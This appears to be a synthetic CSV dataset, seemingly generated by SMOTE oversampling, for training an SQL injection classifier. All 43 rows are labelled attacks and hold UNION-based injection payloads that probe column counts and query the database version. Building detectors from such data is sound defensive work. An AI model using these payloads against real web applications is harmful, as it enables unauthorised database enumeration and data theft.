id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",nearest_attack_euclidean,R000301,0.7378349062366807
SMOTE_000002,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,0.8405960209733984
SMOTE_000003,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.3258854241433904
SMOTE_000004,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000234,0.5382142069257244
SMOTE_000005,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000129,0.055822854798021904
SMOTE_000006,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000188,0.4130968283215909
SMOTE_000007,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,0.4994869965569482
SMOTE_000008,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,0.5843618071261146
SMOTE_000009,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000310,6.630441265284432
SMOTE_000010,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000138,0.8440699197149777
SMOTE_000011,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000007,0.07003182968523324
SMOTE_000012,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000270,0.1641495721203144
SMOTE_000013,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000135,0.16746564798190727
SMOTE_000014,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000089,0.1461150592687925
SMOTE_000015,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000132,0.44777122546118064
SMOTE_000016,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,0.03948264338048763
SMOTE_000017,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,0.23594416492422346
SMOTE_000018,attack,union," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000037,11.575384245428097
SMOTE_000019,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000232,1.198626917163458
SMOTE_000020,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,1.0844871840627501
SMOTE_000021,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,0.18678564238818315
SMOTE_000022,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,0.7398779282712685
SMOTE_000023,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.3877499025806381
SMOTE_000024,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000308,0.5901277959936055
SMOTE_000025,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000264,0.18804074773584953
SMOTE_000026,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,2.5428879973374783
SMOTE_000027,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,0.9637364720211583
SMOTE_000028,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000237,1.1961142606679886
SMOTE_000029,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000158,0.5123562736974685
SMOTE_000030,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000281,0.3980049760921927
SMOTE_000031,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000072,0.4188450991584716
SMOTE_000032,attack,union,"-5625"" union all select 6087,6087,6087,6087,6087,6087--",nearest_attack_euclidean,R000124,0.8933237409240423
SMOTE_000033,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000228,0.039961777519167144
SMOTE_000034,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000064,1.1382054040491378
SMOTE_000035,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,0.44777100249943264
SMOTE_000036,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000078,0.15121212121483202
SMOTE_000037,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.815004013997287
SMOTE_000038,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000291,0.17917383185247168
SMOTE_000039,attack,union,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",nearest_attack_euclidean,R000256,0.37042746876825516
SMOTE_000040,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,0.2886981494162877
SMOTE_000041,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,0.9126490538111055
SMOTE_000042,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.39158029011596834
SMOTE_000043,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,0.2672919481131926
